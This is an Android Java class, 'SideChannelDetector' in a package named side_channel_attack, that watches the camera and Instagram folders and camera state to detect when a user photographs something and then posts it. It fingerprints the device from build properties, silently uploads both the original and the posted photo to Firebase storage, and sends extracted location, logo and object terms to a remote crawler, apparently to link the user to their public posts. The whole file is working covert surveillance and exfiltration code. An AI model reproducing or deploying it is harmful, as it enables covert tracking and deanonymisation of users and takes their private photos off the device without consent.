package com.example.side_channel_attack;

import android.content.Context;
import android.graphics.Bitmap;
import android.hardware.camera2.CameraManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.FileObserver;
import android.provider.MediaStore;
import android.support.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.functions.FirebaseFunctions;
import com.google.firebase.functions.HttpsCallableReference;
import com.google.firebase.functions.HttpsCallableResult;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class SideChannelDetector {
    private final Context context;
    private FileObserver dcimObserver;
    private FileObserver instagramObserver;
    private int PASSIVE_STATE = 1;
    private int ACTIVE_STATE = 0;

    private File imagePreModified;
    private File imagePostModified;
    private String timestamp;
    private String id;
    private String url;
    private FirebaseFunctions mFunctions;

    private long activeStateStartTime;

    public SideChannelDetector(final Context context) {


        this.context = context;
        setUpDCIMListener();
        setUpInstagramListener();
        setUpCameraListener(context);

    }

    private void setUpCameraListener(Context context) {
        final PacketCatcher packetCatcher = new PacketCatcher();
        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        manager.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
            @Override
            public void onCameraAvailable(String cameraId) {
                super.onCameraAvailable(cameraId);
                if (ACTIVE_STATE == 1) {
                    boolean outcomeOf1stEvent = packetCatcher.scan(120000);
                    if (outcomeOf1stEvent) {
                        activeStateStartTime = System.currentTimeMillis() - 4000;
                    } else {
                        PASSIVE_STATE = 1;
                        ACTIVE_STATE = 0;
                    }
                }
            }

            @Override
            public void onCameraUnavailable(String cameraId) {
                super.onCameraUnavailable(cameraId);
                PASSIVE_STATE = 1;
                ACTIVE_STATE = 0;
            }
        }, null);
    }

    private void setUpDCIMListener() {
        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera");
        dcimObserver = new FileObserver(dir.getPath()) {


            @Override
            public void onEvent(int event, String file) {
                if (PASSIVE_STATE == 1) {
                    if (event == FileObserver.CREATE && !file.equals(".probe")) {
                        imagePreModified = new File(dir.getPath() + "/" + file);
                        PASSIVE_STATE = 0;
                        ACTIVE_STATE = 1;
                    }
                }
            }
        };
        dcimObserver.startWatching();
    }

    private void setUpInstagramListener() {
        final File instagramDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        final File dir = new File(instagramDirectory.getAbsolutePath() + "/Instagram");
        instagramObserver = new FileObserver(dir.getPath()) {
            @Override
            public void onEvent(int event, String file) {
                if (ACTIVE_STATE == 1) {
                    if (event == FileObserver.CREATE && !file.equals(".probe")) {
                        PASSIVE_STATE = 1;
                        ACTIVE_STATE = 0;
                        long activeStateEndTime = System.currentTimeMillis();
                        if ((activeStateEndTime - activeStateStartTime) >= 8000) {
                            imagePostModified = new File(dir.getPath() + "/" + file);
                            timestamp = getCurrentUTCTimestamp();
                            sendData();
                        }
                    }
                }
            }
        };
        instagramObserver.startWatching();
    }

    private void sendData() {

        FirebaseFirestore db = FirebaseFirestore.getInstance();

        id = "" +
                Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +
                Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +
                Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +
                Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +
                Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +
                Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +
                Build.USER.length() % 10; //13 digits

        final DocumentReference entryRef = db.collection("invocations").document();
        final DocumentReference existRef = db.collection("users").document(id);

        final Map<String, Object> entry = new HashMap<>();

        entry.put("date", timestamp);
        entry.put("id", id);

        existRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                if (!task.getResult().exists()) {
                    final String preImageName = id + "_" + System.currentTimeMillis() + ".jpg";
                    final UploadTask preImageStream = uploadImage(preImageName, imagePreModified);

                    preImageStream.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            mFunctions = FirebaseFunctions.getInstance();
                            Map<String, Object> data = new HashMap<>();
                            data.put("text", preImageName);
                            mFunctions
                                    .getHttpsCallable("filter")
                                    .call(data).
                                    addOnSuccessListener(new OnSuccessListener<HttpsCallableResult>() {
                                        @Override
                                        public void onSuccess(HttpsCallableResult httpsCallableResult) {

                                            final HashMap<String, ArrayList<String>> data =
                                                    (HashMap<String, ArrayList<String>>) httpsCallableResult.getData();

                                            preImageStream.getResult().getStorage().delete();



                                            final String postImageName = id + "_" + (System.currentTimeMillis() + 1) + ".jpg";
                                            final UploadTask postImageStream = uploadImage(postImageName, imagePostModified);
                                            postImageStream.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                                                @Override
                                                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                                    taskSnapshot.getStorage().getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                                                        @Override
                                                        public void onSuccess(final Uri uri) {
                                                            url = uri.toString();
                                                            entryRef.set(entry).addOnCompleteListener(new OnCompleteListener<Void>() {
                                                                @Override
                                                                public void onComplete(@NonNull Task<Void> task) {

                                                                    int counter = 0;

                                                                    String[] matchStrings = new String[]
                                                                            {"locationMatches",
                                                                                    "logoMatches",
                                                                                    "webMatches",
                                                                                    "objectMatches",
                                                                                    "labelMatches"};

//
                                                                    for (String category : matchStrings) {
                                                                        for (String term : data.get(category)) {
//
                                                                            int apiContainer = (int) ((Math.floor(((double) counter) / 10)) % 3);
                                                                            System.out.println(term);
                                                                            queryCrawler(apiContainer, term);
                                                                            if (counter++ == 30) {
                                                                                break;
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            });
                                                        }
                                                    });
                                                }
                                            });


                                        }
                                    });

                        }
                    });
                }
            }
        });
    }

    private UploadTask uploadImage(String name, File image) {

        try {

            //compress image
            Bitmap bmp = MediaStore.Images.Media.getBitmap(context.getContentResolver(), Uri.fromFile(image));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bmp.compress(Bitmap.CompressFormat.JPEG, 25, baos);
            byte[] data = baos.toByteArray();
            StorageReference storageRef = FirebaseStorage.getInstance().getReference();
            final StorageReference ref = storageRef.child(name);

            return ref.putBytes(data);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }


        return null;
    }


    private void queryCrawler(int apiContainer, String term) {
        Map<String, Object> parameters =
                getParams("tag", term);

        parameters.put("apiSlot", apiContainer);
        HttpsCallableReference searchSingle = mFunctions
                .getHttpsCallable("searchSingle");
        searchSingle.call(parameters);
    }


    private Map<String, Object> getParams(String additionalKey, String additionalVal) {
        Map<String, Object> parameters = new HashMap<>();
        //default
        parameters.put("url", url);
        parameters.put("id", id);
        parameters.put("timestamp", timestamp);
        //additional
        parameters.put(additionalKey, additionalVal);
        return parameters;
    }

    private String getCurrentUTCTimestamp() {
        Calendar c = Calendar.getInstance();
        SimpleDateFormat dateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

        return dateformat.format(c.getTime());

    }
}
